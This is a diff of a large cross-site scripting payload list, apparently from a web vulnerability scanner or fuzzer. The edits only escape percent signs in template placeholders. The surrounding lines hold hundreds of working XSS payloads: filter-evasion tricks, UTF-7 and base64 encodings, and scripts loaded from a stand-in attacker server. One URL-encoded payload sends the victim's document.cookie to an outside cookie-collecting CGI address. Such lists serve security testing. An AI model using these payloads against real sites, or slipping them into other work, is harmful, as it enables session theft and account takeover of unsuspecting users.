@@ -377,7 +377,7 @@ foo%00<script>alert(1)</script>
 <head><base href="javascript://"></head><body><a href="/. /,javascript:alert(1)//#">KCF</a></body>
 <HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert(1);+ADw-/SCRIPT+AD4-
 <HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('KCF');+ADw-/SCRIPT+AD4-
-<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-%(payload)s;+ADw-/SCRIPT+AD4-
+<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-%25(payload)s;+ADw-/SCRIPT+AD4-
 <HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="KCF<SCRIPT DEFER>javascript:alert(1)</SCRIPT>"></BODY></HTML>
 <html onMouseDown html onMouseDown="javascript:javascript:alert(1)"></html onMouseDown>
 <html onMouseEnter html onMouseEnter="javascript:parent.javascript:alert(1)"></html onMouseEnter>
@@ -391,7 +391,7 @@ foo%00<script>alert(1)</script>
 <html onMouseWheel html onMouseWheel="javascript:javascript:alert(1)"></html onMouseWheel>
 htmlStr = '<a href="javascript:alert(1)">kcf</a>'; document.getElementById('body').innerHTML = htmlStr; try { alert(1);}catch(e){alert(1);};
 htmlStr = '<a href="javascript:alert(1)">kcf</a>'; document.getElementById('body').innerHTML = htmlStr; try { if(document.getElementById('body').firstChild.protocol === 'javascript:') { alert(1); } }catch(e){alert(1);};
-<HTML xmlns:kcf><?import namespace="kcf" implementation="%(htc)s"><kcf:kcf>KCF</kcf:kcf></HTML>""","XML namespace."),("""<XML ID="kcf"><I><B><IMG SRC="javas<!-- -->cript:javascript:alert(1)"></B></I></XML><SPAN DATASRC="#KCF" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
+<HTML xmlns:kcf><?import namespace="kcf" implementation="%25(htc)s"><kcf:kcf>KCF</kcf:kcf></HTML>""","XML namespace."),("""<XML ID="kcf"><I><B><IMG SRC="javas<!-- -->cript:javascript:alert(1)"></B></I></XML><SPAN DATASRC="#KCF" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
 http://%22%20onerror=%22alert%281%29;//
 http://www.keralacyberforce<script .in>alert(document.location)</script
 http://www.<script>alert(1)</script .com
@@ -439,7 +439,7 @@ http://www.<script>alert(1)</script .com
 <iframe/src \/\/onload = prompt(1)
 <IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
 <iframe src="vbscript:alert()></iframe>
-<iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
+<iframe style="position:absolute;top:0;left:0;width:100%25;height:100%25" onmouseover="prompt(1)">
 <!--[if]><script>alert(1)</script -->
 <!--[if]><script>javascript:alert(1)</script -->
 <image src=1 href=1 onerror="javascript:alert(1)"></image>
@@ -698,7 +698,7 @@ kcf<div style="xexpression(alert(1))">kcf
 <meta charset= "x-imap4-modified-utf7"&&>&&<script&&>javascript:alert(1)&&;&&<&&/script&&>
 <meta charset="x-imap4-modified-utf7">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>
 <meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>
-<META HTTP-EQUIV="Link" Content="<%(css)s>; REL=stylesheet">
+<META HTTP-EQUIV="Link" Content="<%25(css)s>; REL=stylesheet">
 <META HTTP-EQUIV="Link" Content="<javascript:alert(1)>; REL=stylesheet">
 <META HTTP-EQUIV="refresh" CONTENT="0.1; URL=javascript:void()//?;URL=javascript:alert(1)//">
 <meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>
@@ -730,7 +730,7 @@ kcf<div style="xexpression(alert(1))">kcf
 <OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert(1)></OBJECT>
 <OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:javascript:alert(1)></OBJECT>
 <object classid="clsid:..." codebase="javascript:alert(1);">
-<object data="data:text/html;base64,%(base64)s">
+<object data="data:text/html;base64,%25(base64)s">
 <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgiS0NGIik8L3NjcmlwdD4="></object>
 <object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgiS0NGIik8L3NjcmlwdD4=></object>​
 <object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgnS0NGJyk8L3NjcmlwdD4=></object>
@@ -748,7 +748,7 @@ object id="x" classid="clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598"></object> <ob
 <object type="text/x-scriptlet" data="http://XXXxenotixXXX:3555/xss_serve_payloads/bmpz.bmp"></object>
 <OBJECT TYPE="text/x-scriptlet" DATA="http://XXXxenotixXXX:3555/xss_serve_payloads/kcf.html"></OBJECT>
 <object type="text/x-scriptlet" data="http://XXXxenotixXXX:3555/xss_serve_payloads/kcf.js"></object>
-<OBJECT TYPE="text/x-scriptlet" DATA="%(scriptlet)s"></OBJECT>
+<OBJECT TYPE="text/x-scriptlet" DATA="%25(scriptlet)s"></OBJECT>
 +onerror=alert(1)%3E/
 onerror=eval;throw'alert%281%29';
 +onerror=prompt(1)%3E/
@@ -817,7 +817,7 @@ s%22%20style=x:expression(alert(1))
 <SCRIPT>a=/KCF/alert(a.source)</SCRIPT>
 "'`><script>a=/kcf;;i=0;alert(1);a/i;</script>
 <SCRIPT>a=/KCF/\nalert(1);</SCRIPT>
-<script ~~~>alert(0%0)</script ~~~>
+<script ~~~>alert(0%250)</script ~~~>
 <<SCRIPT>alert(1);/
 <script>alert(1,1</script//)</script>
 <script>alert(1,1</script/)</script>
@@ -825,7 +825,7 @@ s%22%20style=x:expression(alert(1))
 <script>’alert(1)’.replace(/.+/,eval)</script>
 <<script>alert(1);</script>
 <!-- -- --><script>alert(1);</script><!-- -- -->
-<%<!--'%><script>alert(1);</script -->
+<%25<!--'%25><script>alert(1);</script -->
 <script<{alert(1)}/></script </>
 <script>/* */alert(1)// */</script>
 <script>alert(\'\\/\\1\\/\\\')</script>
@@ -900,8 +900,8 @@ s%22%20style=x:expression(alert(1))
 "`'><script>%C2%A0javascript:alert(1)</script>
 <script charset="%22>javascript:alert(1)</script>
 <script charset='utf-8'>alert(1)</script>
-<script> chr=String.fromCharCode(1); result=''; try{ result=encodeURI(chr); }catch(e){} if(!/%/.test(result)&&result.length) { ids.push(1); } </script>
-<script> chr=String.fromCharCode(1); result=''; try{ result=encodeURIComponent(chr); }catch(e){} if(!/%/.test(result)&&result.length) { ids.push(1); } </script>
+<script> chr=String.fromCharCode(1); result=''; try{ result=encodeURI(chr); }catch(e){} if(!/%25/.test(result)&&result.length) { ids.push(1); } </script>
+<script> chr=String.fromCharCode(1); result=''; try{ result=encodeURIComponent(chr); }catch(e){} if(!/%25/.test(result)&&result.length) { ids.push(1); } </script>
 <script /***/>/***/confirm('%FF41%FF4C%FF45%FF52%FF54%1455%FF11%1450')/***/</script /***/
 <script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(1)',384,null,'rsa-dual-use')</script>
 <script> document.cookie='kcf'; if(document.cookie !== 'kcf') { alert(1,document.cookie); } </script>
@@ -964,7 +964,7 @@ s%22%20style=x:expression(alert(1))
 \'><script>KCF<\/script>
 <SCRIPT/KCF SRC="http://XXXxenotixXXX:3555/xss_serve_payloads/bmpz.bmp"></SCRIPT>
 <SCRIPT/KCF SRC="http://XXXxenotixXXX:3555/xss_serve_payloads/kcf.js"></SCRIPT>
-<script language='javascript' src='%(jscript)s'></script>
+<script language='javascript' src='%25(jscript)s'></script>
 <script language=vbs>execScript(“alert(1)”)</script>
 <SCRIPT LANGUAGE=VBS>EXECSCRIPT(LCASE(“ALERT(1)”)) </SCRIPT>
 <script language=vbs>MsgBox 1</script>
@@ -976,8 +976,8 @@ s%22%20style=x:expression(alert(1))
 <script onreadystatechange=alert(1)>
 <SCRIPT onreadystatechange=javascript:javascript:alert(1);></SCRIPT>
 <script onReadyStateChange script onReadyStateChange="javascript:javascript:alert(1)"></script onReadyStateChange>
-<script>%(payload)s</script>
-<<SCRIPT>%(payload)s//<</SCRIPT>
+<script>%25(payload)s</script>
+<<SCRIPT>%25(payload)s//<</SCRIPT>
 <script>prompt(1)</script>
 ‘><script>prompt(1)</script>
 ‘/><script>prompt(1)</script>
@@ -1030,12 +1030,12 @@ SCRIPT>">'><SCRIPT>alert(String.fromCharCode(75,67,70))</SCRIPT>
 <SCRIPT SRC=http://XXXxenotixXXX:3555/xss_serve_payloads/kcf.js></SCRIPT>
 <SCRIPT/SRC="http://XXXxenotixXXX:3555/xss_serve_payloads/kcf.js"></SCRIPT>
 <script src="javascript:alert(1)">
-<SCRIPT SRC="%(jpg)s"></SCRIPT>
-<SCRIPT SRC=%(jscript)s?<B>
-<script src="/\%(jscript)s"></script>
-<script src="\\%(jscript)s"></script>
-<script src=%(jscript)s></script>
-<SCRIPT/SRC="%(jscript)s"></SCRIPT>
+<SCRIPT SRC="%25(jpg)s"></SCRIPT>
+<SCRIPT SRC=%25(jscript)s?<B>
+<script src="/\%25(jscript)s"></script>
+<script src="\\%25(jscript)s"></script>
+<script src=%25(jscript)s></script>
+<SCRIPT/SRC="%25(jscript)s"></SCRIPT>
 <SCRIPT SRC=//XXXxenotixXXX:3555/xss_serve_payloads/.j>
 </script><svg onload='-/"/-alert(1)//'>
 <script/&Tab; src='http://XXXxenotixXXX:3555/xss_serve_payloads/bmpz.bmp' /&Tab;></script>
@@ -1071,7 +1071,7 @@ SCRIPT>">'><SCRIPT>alert(String.fromCharCode(75,67,70))</SCRIPT>
 <style><img src="</style><img src=x onerror=alert(1)//">
 <style><img src="</style><img src=x onerror=javascript:alert(1)//">
 <style><img src="</style><img src=x onerror=prompt(1)//">
-<STYLE>@import'%(css)s';</STYLE>
+<STYLE>@import'%25(css)s';</STYLE>
 <style>@import "data:,*%7bx:expression(javascript:alert(1))%7D";</style>
 <style>@import "data:,*%7bx:expression(write(1))%7D";</style>
 <STYLE>@im\port'\ja\vasc\ript:alert(1)';</STYLE>
@@ -1156,7 +1156,7 @@ SCRIPT>">'><SCRIPT>alert(String.fromCharCode(75,67,70))</SCRIPT>
 </TITLE><SCRIPT>alert("KCF");</SCRIPT>
 ></title><script>alert(KCF)</script>'"><marquee><h1>Kerala Cyber Force</h1></marquee>
 " type=image src=null onerror=KCF " \' type=image src=null onerror=KCF \'
-?variable=%22%3e%3c%73%63%72%69%70%74%3e%64%6f%63%75%6d%65%6e%74%2e%6c%6f%63%61%74%69%6f%6e%3d%27%68%74%74%70%3a%2f%2f%77%77%77%2e%63%67%69%73%65%63%75%72%69%74%79 %2e%63%6f%6d%2f%63%67%69%2d%62%69%6e%2f%63%6f%6f%6b%69%65%2e%63%67%69%3f%27%20%2b%64%6f%63% 75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%3c%2f%73%63%72%69%70%74%3e
+?variable=%22%3e%3c%73%63%72%69%70%74%3e%64%6f%63%75%6d%65%6e%74%2e%6c%6f%63%61%74%69%6f%6e%3d%27%68%74%74%70%3a%2f%2f%77%77%77%2e%63%67%69%73%65%63%75%72%69%74%79 %2e%63%6f%6d%2f%63%67%69%2d%62%69%6e%2f%63%6f%6f%6b%69%65%2e%63%67%69%3f%27%20%2b%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%3c%2f%73%63%72%69%70%74%3e
 <var onmouseover="prompt(1)">KCF</var>​
 <video onerror="javascript:alert(1)"><source>
 <video onerror="javascript:javascript:alert(1)"><source>
@@ -1184,7 +1184,7 @@ X<form id=test onforminput=javascript:alert(1)><input></form>
 <?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time">
 <xml onPropertyChange xml onPropertyChange="javascript:javascript:alert(1)"></xml onPropertyChange>
 <xml onreadystatechange=alert(1)>
-<xml> <rect style="height:100%;width:100%" id="kcf" onmouseover="alert(1)" strokecolor="white" strokeweight="2000px" filled="false" /> </xml>
+<xml> <rect style="height:100%25;width:100%25" id="kcf" onmouseover="alert(1)" strokecolor="white" strokeweight="2000px" filled="false" /> </xml>
 <xml src="javascript:alert(1);">
 <?xml-stylesheet href="javascript:alert(1)"?><root/>
 <?xml-stylesheet type="text/css" href="data:,*%7bx:expression(write(2));%7d"?>
@@ -1197,7 +1197,7 @@ X<form id=test onforminput=javascript:alert(1)><input></form>
 <x style="background:url('x&#1;;color:red;/*')">KCF</x>
 <x style="background:url('x[a];color:red;/*')">XXX</x>
 <x style=behavior:url(#default#time2) onbegin=alert(1)>
-<x style="behavior:url(%(sct)s)">
+<x style="behavior:url(%25(sct)s)">
 <x style="behavior:url(test.sct)">
 <x style=x:expression(alert(1))>
 X<x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1)` >
